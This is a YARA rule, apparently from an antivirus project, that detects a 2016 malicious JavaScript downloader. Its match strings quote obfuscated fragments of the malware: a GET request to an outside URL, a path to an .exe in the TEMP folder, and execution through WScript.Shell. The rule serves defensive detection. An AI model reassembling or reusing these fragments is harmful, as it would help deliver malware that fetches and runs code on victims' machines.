rule sig_20160401_0ededeb0f929448ddd4a97e823e2e0c1 {
  meta:
    description = "datamaliciousorder - file 20160401_0ededeb0f929448ddd4a97e823e2e0c1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "43f476f3f40db9830be27102ac183936d1793ccde8d69a37320ece0b7d933099"

  strings:
    $s1  = "BakJsn[LywQfu](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function MfIj(DlvMt, ZzyPuh){OjMv = OjMv * 1; return DlvMt - ZzyPuh;};" fullword ascii
    $s3  = "var TpPcg = function SsGog() {return WScript[XxvFz](\"WScript\"+\".Shell\");}(), TeOeb = 11;" fullword ascii
    $s4  = "if (BakJsn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OaGvu(){return XwOo + \"\";};" fullword ascii
    $s6  = "function IlPc() {return TpPcg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pEbgwFFtlHv1Jec.ex\" + \"e\";};" fullword ascii
    $s7  = "function NzZk() {return ((KleJza == true) && (KleJza == DflVb)) ? 1 : OjMv;};" fullword ascii
    $s8  = "function KtoLfr(){return 23;};" fullword ascii
    $s9  = "return MfIj(SknRs, SkbWa);" fullword ascii
    $s10 = "KleJza = true; " fullword ascii
    $s11 = "function OyFvf(){return XxvFz;};" fullword ascii
    $s12 = "function ExGr(AgXc) {var GsmUsh = (1, 2, 3, 4, 5, AgXc); return GsmUsh;};" fullword ascii
    $s13 = "var TiOmq = new this[\"Date\"]();" fullword ascii
    $s14 = "var KleJza = false;" fullword ascii
    $s15 = "function GmRc(GcDr){TpPcg[\"R\"+\"un\"](GcDr, OjMv, OjMv);};" fullword ascii
    $s16 = "var FkXn = false;" fullword ascii
    $s17 = "var DflVb = false;" fullword ascii
    $s18 = "DflVb = true; " fullword ascii
    $s19 = "function CfDs()" fullword ascii
    $s20 = "}while (WrrTjy);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}